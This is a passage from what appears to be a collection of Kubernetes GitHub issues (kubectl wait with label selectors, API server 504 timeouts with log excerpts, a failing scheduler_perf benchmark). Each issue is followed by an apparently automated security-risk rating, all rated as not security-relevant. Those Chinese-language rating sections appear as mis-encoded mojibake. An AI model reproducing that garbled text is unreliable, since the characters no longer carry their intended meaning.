This issue is especially noticeable when working with generated resources. For instance, you might have some trigger after a while to invoke e.g. a Tekton PipelineRun. These PipelineRuns have predictable labels but unpredictable names, making name-based waiting impossible.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
Local kind cluster, v0.24.0
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME=Gentoo
ID=gentoo
PRETTY_NAME="Gentoo Linux"
ANSI_COLOR="1;32"
HOME_URL="https://www.gentoo.org/"
SUPPORT_URL="https://www.gentoo.org/support/"
BUG_REPORT_URL="https://bugs.gentoo.org/"
VERSION_ID="2.15"
$ uname -a
Linux 6.9.2-gentoo #1 SMP PREEMPT_DYNAMIC Mon May 27 01:25:56 CEST 2024 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨`kubectl wait --for=create`å‘½ä»¤å¹¶æ­é…æ ‡ç­¾é€‰æ‹©å™¨ï¼ˆ`-l`é€‰é¡¹ï¼‰æ—¶ï¼Œå‘½ä»¤æ— æ³•æ­£ç¡®ç­‰å¾…èµ„æºåˆ›å»ºï¼Œè€Œæ˜¯ç«‹å³é€€å‡ºå¹¶æç¤º`error: no matching resources found`ã€‚è¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§é”™è¯¯ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚æ­¤é—®é¢˜å¹¶æœªæ¶‰åŠä»»ä½•å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨é£é™©ï¼Œä¹Ÿæ²¡æœ‰å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

- **æ ‡å‡†6**ï¼šå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128509 The request times out in dozens of milliseconds.

- Issue é“¾æ¥ï¼š[#128509](https://github.com/kubernetes/kubernetes/issues/128509)

### Issue å†…å®¹

#### What happened?

I find that when the number of requests in the cluster is large, the return code 504 is returned for some requests, but the request takes only dozens of milliseconds. Why?
Some APIServer logs are as follows:

E1031 10:16:37.163017      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.163055      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.166591      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
E1031 10:16:37.167083      11 timeout.go:142] post-timeout activity - time-elapsed: 4.003161ms, GET "/api/v1/nodes/work233" result: <nil>
I1031 10:16:37.173768      11 node_authorizer.go:205] "NODE DENY" err="node 'work115' cannot get configmap manager/cloudsop.beidou.hostlog, no relationship to this object was found in the node authorizer graph"
{"level":"warn","ts":"2024-10-31T10:16:37.179181Z","logger":"etcd-client","caller":"v3@v3.5.9/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc002799500/192.167.14.53:2379","attempt":0,"error":"rpc error: code = Canceled desc = context canceled"}
E1031 10:16:37.179302      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"context canceled"}: context canceled
E1031 10:16:37.179404      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.184405      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.184759      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
I1031 10:16:37.189411      11 node_authorizer.go:205] "NODE DENY" err="node 'work115' cannot get configmap manager/caas, no relationship to this object was found in the node authorizer graph"
{"level":"warn","ts":"2024-10-31T10:16:37.191638Z","logger":"etcd-client","caller":"v3@v3.5.9/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc002799500/192.167.14.53:2379","attempt":0,"error":"rpc error: code = Canceled desc = context canceled"}
E1031 10:16:37.191736      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"context canceled"}: context canceled
E1031 10:16:37.191810      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.192091      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.192558      11 timeout.go:142] post-timeout activity - time-elapsed: 12.911662ms, GET "/api/v1/nodes/work233" result: <nil>
E1031 10:16:37.192682      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.192798      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.193019      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.193034      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
{"level":"warn","ts":"2024-10-31T10:16:37.195287Z","logger":"etcd-client","caller":"v3@v3.5.9/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc0038c9c00/192.167.14.53:2379","attempt":0,"error":"rpc error: code = Canceled desc = context canceled"}
E1031 10:16:37.195425      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
E1031 10:16:37.195562      11 timeout.go:142] post-timeout activity - time-elapsed: 10.78091ms, PUT "/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/work233" result: <nil>
{"level":"warn","ts":"2024-10-31T10:16:37.198821Z","logger":"etcd-client","caller":"v3@v3.5.9/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc0038c9c00/192.167.14.53:2379","attempt":0,"error":"rpc error: code = Canceled desc = context canceled"}
{"level":"warn","ts":"2024-10-31T10:16:37.202745Z","logger":"etcd-client","caller":"v3@v3.5.9/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc0038c9c00/192.167.14.53:2379","attempt":0,"error":"rpc error: code = Canceled desc = context canceled"}
E1031 10:16:37.203114      11 finisher.go:175] FinishRequest: post-timeout activity - time-elapsed: 270.763Âµs, panicked: false, err: context canceled, panic-reason: <nil>
E1031 10:16:37.203153      11 finisher.go:175] FinishRequest: post-timeout activity - time-elapsed: 11.033912ms, panicked: false, err: context canceled, panic-reason: <nil>
E1031 10:16:37.203177      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.203218      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
E1031 10:16:37.203244      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.203260      11 finisher.go:175] FinishRequest: post-timeout activity - time-elapsed: 10.568058ms, panicked: false, err: context canceled, panic-reason: <nil>
E1031 10:16:37.210072      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.210110      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.220130      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.220167      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.220237      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
E1031 10:16:37.223611      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.223646      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.228423      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
E1031 10:16:37.228617      11 timeout.go:142] post-timeout activity - time-elapsed: 53.474833ms, PUT "/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/work200" result: <nil>

The preceding log shows that the /apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/work233 request times out in 10 ms.


#### What did you expect to happen?

The request is returned normally.

#### How can we reproduce it (as minimally and precisely as possible)?

Check the APIServer audit logs when the number of requests is large.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.28
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼Œé—®é¢˜æè¿°æ˜¯åœ¨é›†ç¾¤è¯·æ±‚é‡è¾ƒå¤§æ—¶ï¼Œéƒ¨åˆ†è¯·æ±‚è¿”å›äº†504é”™è¯¯ç ï¼Œä½†è¯·æ±‚ä»…è€—æ—¶å‡ åæ¯«ç§’ã€‚æ—¥å¿—æ˜¾ç¤ºAPIServerç”±äº`http: Handler timeout`æ— æ³•å†™å…¥JSONå“åº”ï¼Œè¿˜æœ‰ä¸€äº›å…³äºèŠ‚ç‚¹æ— æ³•è·å–configmapçš„æˆæƒé”™è¯¯ã€‚

ä»è¿™äº›ä¿¡æ¯æ¥çœ‹ï¼Œé—®é¢˜ä¼¼ä¹æ˜¯ç”±äºåœ¨é«˜è´Ÿè½½æƒ…å†µä¸‹ï¼ŒAPIServerå¤„ç†è¯·æ±‚è¶…æ—¶å¯¼è‡´çš„ï¼Œè¿™å¯èƒ½ä¸ç³»ç»Ÿæ€§èƒ½æˆ–é…ç½®æœ‰å…³ï¼Œå¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©æ— æ³•è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ²¡æœ‰è¯æ®è¡¨æ˜æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤é—®é¢˜æ¥è¿›è¡Œæ”»å‡»ã€‚

2. **è¯¥é£é™©ä¸å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´å¹¶è¢«åˆ†é…CVEç¼–å·**ï¼šè¿™æ˜¯ç³»ç»Ÿåœ¨é«˜è´Ÿè½½ä¸‹çš„æ€§èƒ½é—®é¢˜ï¼Œä¸æ¶‰åŠå®‰å…¨æ¼æ´ã€‚

6. **Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜**ï¼šå› æ­¤é£é™©è¯„çº§åˆ¤æ–­ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128483 SchedulingWhileGated test in scheduler-perf failed but was able to produce results

- Issue é“¾æ¥ï¼š[#128483](https://github.com/kubernetes/kubernetes/issues/128483)

### Issue å†…å®¹

#### What happened?

While trying to reproduce the Scheduler_perf results from #127180 , I encountered an issue where the SchedulingWhileGated test failed but still produced results.
Iâ€™m running the following code on an Ubuntu 22.04 Linux VM with 4 CPUs, 8GB memory, and a 100GB hard disk, under various configurations.

`make test-integration WHAT=./test/integration/scheduler_perf ETCD_LOGLEVEL=warn KUBE_TEST_VMODULE="''" KUBE_TEST_ARGS="-run=^$$ -benchtime=1ns -bench=BenchmarkPerfScheduling/SchedulingWhileGated/1Node_10000GatedPods"`

I obtained the following results, which show the same trend the PR mentioned, but my tests actually failed. Could you let me know if this outcome is normal at your convenience please?

> QHint enabled master branch vs. this branch : 117 pods/sâ†’ 103pods/s performance decline
> QHint disabled master branch vs. this branch : 92 pods/s â†’ 123 pods/s performance improve

message generated by executing the code above

```
make[1]: *** [Makefile:192: test] Error 1
make[1]: Leaving directory '/home/xie/go/src/k8s.io/kubernetes'
!!! [1018 05:41:12] Call tree:
!!! [1018 05:41:12] 1: hack/make-rules/test-integration.sh:108 runTests(...)
+++ [1018 05:41:12] Cleaning up etcd
+++ [1018 05:41:13] Integration test cleanup complete
make: *** [Makefile:215: test-integration] Error 1
```


#### What did you expect to happen?

Iâ€™d like to know if this is normal behavior. If itâ€™s not, it should be possible to obtain the correct results without the test failing.

#### How can we reproduce it (as minimally and precisely as possible)?

Run the following code under the following four configurations.
`make test-integration WHAT=./test/integration/scheduler_perf ETCD_LOGLEVEL=warn KUBE_TEST_VMODULE="''" KUBE_TEST_ARGS="-run=^$$ -benchtime=1ns -bench=BenchmarkPerfScheduling/SchedulingWhileGated/1Node_10000GatedPods"` 

I conducted four test cases, and I think each test can generate similar results.
1. Master branch, SchedulerQueueingHints Disable
2. Master branch, SchedulerQueueingHints Enable
3. [#127180](https://github.com/kubernetes/kubernetes/pull/127180) PR branch, SchedulerQueueingHints Disable
4. [#127180](https://github.com/kubernetes/kubernetes/pull/127180) PR branch, SchedulerQueueingHints Enable

#### Anything else we need to know?

/sig scheduling

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼ŒæŠ¥å‘Šè€…åœ¨è¿è¡Œè°ƒåº¦å™¨æ€§èƒ½æµ‹è¯•æ—¶é‡åˆ°äº†æµ‹è¯•å¤±è´¥çš„é—®é¢˜ï¼Œä½†ä»ç„¶ç”Ÿæˆäº†ç»“æœã€‚ä»–ä»¬å¸Œæœ›ç¡®è®¤è¿™æ˜¯å¦æ˜¯æ­£å¸¸è¡Œä¸ºï¼Œä»¥åŠå¦‚ä½•åœ¨ä¸ä½¿æµ‹è¯•å¤±è´¥çš„æƒ…å†µä¸‹è·å¾—æ­£ç¡®çš„ç»“æœã€‚æ•´ä¸ªIssueå†…å®¹æ¶‰åŠæµ‹è¯•è¿‡ç¨‹ä¸­çš„é”™è¯¯å’Œæ€§èƒ½ç»“æœçš„å·®å¼‚ï¼Œæ²¡æœ‰æ¶‰åŠä»»ä½•å®‰å…¨æ¼æ´ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚å› æ­¤ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæœ¬Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

